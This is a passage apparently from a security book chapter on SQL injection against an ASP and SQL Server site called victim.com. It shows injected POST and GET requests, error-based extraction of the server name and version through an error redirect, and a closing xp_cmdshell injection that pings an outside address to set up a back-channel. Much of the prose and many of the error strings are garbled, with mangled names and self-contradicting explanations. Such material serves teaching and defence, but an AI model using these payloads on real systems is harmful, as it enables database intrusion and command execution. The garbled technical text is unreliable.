A SQL injection test doesn't have to target the database tables. By executing generic SQL commands. For example, the eponymous PRINT command prints data. To test for a SQL injection vulnerability, we compare the errors generated by the PRINT command and its misspelling:


...

Microsoft OLE DB Provider for ODBC Drivers (0x80040E14) [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1: Incorrect syntax near ','

This shows another success. In both cases, we passed the PRINT command through ASP to the database, as evidenced by the ODBC error in both cases. For the first case, the misspelled PRINT command produced the incorrect syntax as expected. In the second case, the incorrect syntax is a mysterious comma—indicating that the database accepted the PRINT statement, but was expecting to print (or another argument for a stored procedure). Although a SQL technique does not vary, its method of injection changes based on the design of the application. The next few examples are more difficult to execute because the attacks must be performed POST requests. We must leave the comfort of the URL and move into tools such as Achilles.

During the course of the application survey we find a POST command in the PageSearch.asp file. The arguments are as follows:

```
Send=1&hidSearchType=1&selTextField=L_Name&txtSearchValue=zombie
```

The parameter selTextField looks like a place to start. It appears to be a placeholder for the query on the L_Name (probably "last name") in a table. Instead of picking a tick in the argument string, let's go for the journey—to select from a different column.

```
http://www.victim.com/PageSearch.asp
POST: Send=1&hidSearchType=1&selTextField=UserID&txtSearchValue=zombie
Microsoft O DB Provider for ODBC Drivers (0x80040214)
[Microsoft][ODBC SQL Server]Invalid column name 'UserID'.
/includes/spActionTable.inc, line 51
```

According to our magnifying glass deerstalk attack methodology, PageSearch.asp is susceptible to SQL injection, there is no column named UserID in the table, and we have the name of a file not referenced elsewhere in the application. Not bad for a single change in one database.

Once, we are foiled by a strong policy. A better policy for the server would have removed many of the stored procedures that we have accessing. Here are more examples that demonstrate how to manipulate an application's error-handling routine. The DataList.asp file is vulnerable to SQL injection. However, a casual observer might miss this fact because the HTML output displays a custom-error page, the text of which reads: The database encountered an error. Please inform the system.

However, if we actually examine the error redirect then we notice that the parameters to the GET request contain the raw error. Here is a request: https://www.victim.com/DataList.asp?Page=1&PageName=@ServerName -- https://www.victim.com/Error.asp?log=True&ec=4&en=214721900&Could=not+find+procedure='ServerName'
Microsoft OLE DB Provider for SQL Server&pn=RL2&fn=Execute

The initial request combined three techniques: the (--), a default procedure (@ServerName), and nested procedures (wrapped in parentheses). The SQL injection worked, but its results are not where we expect them. Take a look at the "error" in the redirected URL. If we use the URL encoding, the correlation is readily apparent: We have managed to execute a stored procedure, even though the application's SQL query, @@ServerName, the server interprets it, then tries to insert the procedure to which it was variable. Thus, @@ServerName is the server name where the SQL database resides. Here are two more examples of exploiting the error:

```
Sent -- https://www.victim.com/DataList.asp?Page=1&PageName=(Serverversion) -- Received -- https://www.victim.com/Error.asp?log=True&ec=4&en=214721900&Line=13+Insert+syntax='31412862'
Microsoft OLE DB Provider for SQL Server&pn=RL2&fn=Execute
```

```
Sent -- https://www.victim.com/DataList.asp?Page=2&PageName=sp_who2+sa Received -- https://www.victim.com/Error.asp?log=True&ec=4&en=214721900&error=Login='sa' does+not+exist.
Microsoft OLE DB Provider for SQL Server&pn=RL2&fn=Execute
```

Complete lists of @variables, sp, and xp are found in this chapter in Tables 9-2, 9-3, 9-4, and 9-5. For now, we want to demonstrate the SQL injection though: Oops, we omitted the '" characters and informed that the "sa_Get" user does not exist. Still, this is instructive in deducing the original form of the SQL query as well as demonstrating the importance of correct SQL grammar. The URL should appear:

https://www.victim.com/DataList.asp?Page=24&PageName=sp_who2+sa--

Unfortunately, this HTML page contains the column names for the sp_who2 command, but not the output. In this scenario we were limited to return a single string, as the server's name or the software's version number. It would take some multiline SQL statements to gather more verbose information. Let's get back for a second and demonstrate why this happens. We omit the comment (--) and examine the output:

```
Sent -- https://www.victim.com/DataList.asp?Page=24&PageName=-
Received -- https://www.victim.com/Error.asp?log=True&e=4&en=-214721906&line=1:syntax=4'&6&E=Microsoft OLE DB+Provider=SQL+Server&rlenEnc&fn=ExecuteSQL
```

As you can see, the terminated SQL statement ends with an end command. All have been done providing stored procedures for the application to execute. As a parting thought, consider the option that we do not need to return data in the error field. If we perform SQL injection, then we most likely have access to the xp_cmdshell, an extended stored procedure that provides the equivalent of cmd.exe. We run a dump on our system, then try a ping. If we see any incoming ICMP traffic, then it won't take long to build a back-channel into the database. Note that it probably be from the IP address of victim.com. The database is making the connection, so the IP address could be a neighboring server, a connection made through a NAT firewall, or no connection at all if strong network controls are in place on victim's network.

```
https://www.victim.com/DataList.asp?Page=24&PageName=master..xp_cmdshell"ping 192.168.90.12--"
```
